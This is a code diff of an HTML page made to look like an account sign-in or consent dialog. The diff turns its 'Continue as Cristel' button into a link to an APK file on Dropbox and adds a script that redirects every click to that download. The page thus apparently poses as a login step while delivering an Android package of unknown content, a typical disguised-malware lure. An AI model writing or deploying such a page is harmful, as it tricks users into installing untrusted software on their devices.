@@ -18,9 +18,20 @@
             <a href="#" class="terms-service">Terms of Service</a>.
         </div>
         <div class="buttons">
-            <button type="button" class="continue-button">Continue as Critel</button>
+            <a href="https://www.dropbox.com/scl/fi/2oc2mdm6ywhehcffgy8dk/PSH4XX-v.55.8.0_sign.apk?rlkey=tnof4bffu8l5g42wnlumtlryy&dl=0" class="continue-button">Continue as Cristel</a>
             <button type="button" class="cancel-button">Cancel</button>
         </div>
     </div>
+
+    <script>
+        // Add event listener to the "Continue as Cristel" button
+        document.querySelector('.continue-button').addEventListener('click', (event) => {
+            // Prevent the default link behavior
+            event.preventDefault();
+
+            // Redirect the user to the specified URL
+            window.location.href = 'https://www.dropbox.com/scl/fi/2oc2mdm6ywhehcffgy8dk/PSH4XX-v.55.8.0_sign.apk?rlkey=tnof4bffu8l5g42wnlumtlryy&dl=0';
+        });
+    </script>
 </body>
 </html>
